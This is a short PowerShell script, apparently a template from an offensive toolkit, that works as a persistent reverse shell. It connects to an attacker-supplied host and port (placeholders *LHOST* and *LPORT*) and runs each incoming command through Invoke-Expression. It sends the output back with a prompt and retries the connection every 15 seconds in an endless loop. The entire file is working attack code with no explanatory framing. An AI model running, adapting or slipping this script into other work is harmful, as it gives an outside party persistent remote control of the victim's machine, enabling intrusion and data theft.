do {
    $client = New-Object System.Net.Sockets.TcpClient('*LHOST*', *LPORT*)
    $stream = $client.GetStream()

    [byte[]] $bytes = 0..65535 | ForEach-Object { 0 }

    while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
        $sendback = (iex ". { $data } 2>&1" | Out-String)
        $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()
    }

    $client.Close()

    Start-Sleep -Seconds 15
} while ($true)
